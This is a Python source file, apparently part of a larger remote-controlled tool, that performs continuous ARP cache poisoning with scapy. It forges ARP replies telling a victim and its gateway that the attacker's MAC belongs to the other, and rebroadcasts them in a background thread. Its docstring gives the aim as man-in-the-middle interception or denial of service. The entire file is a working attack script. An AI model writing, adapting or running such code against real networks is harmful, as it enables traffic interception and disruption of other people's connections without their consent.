import time
import threading
from scapy.all import send
from scapy.layers.l2 import ARP
from Server.core.network_info import get_my_ip, get_my_mac, get_default_gateway
from Server.core.remote_output import remote_print

_stop_event = threading.Event()

def reset_arp_spoof_stop():
    _stop_event.clear()


def stop_arp_spoof():
    _stop_event.set()

def continuous_arp_dos(
    victim_ip: str = None,
    gateway_ip: str = None,
    attacker_mac: str = None,
    iface: str = None,
    interval: float = 2.0
):
    """Continuously poisons ARP caches of both victim and gateway to perform MiTM/DoS."""
    gateway_ip = gateway_ip or get_default_gateway()
    attacker_mac = attacker_mac or get_my_mac()

    # Craft deceptive ARP reply packets: telling victim we are the gateway, and vice versa
    pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac)

    is_running = True

    def loop():
        """Background loop repeatedly broadcasting false ARP mappings."""
        while is_running:
            send(pkt_to_victim, iface=iface, verbose=False)
            send(pkt_to_gateway, iface=iface, verbose=False)
            time.sleep(interval)

    # Start sending poison packets in a background thread
    worker = threading.Thread(target=loop, daemon=True)
    worker.start()

    remote_print(f"[RED] Poisoning: {victim_ip} <-> {gateway_ip}")
    input("Press Enter to stop...\n")

    # Stop background loop and restore clean state
    is_running = False
    remote_print("[+] Stopped.")

if __name__ == "__main__":
    continuous_arp_dos()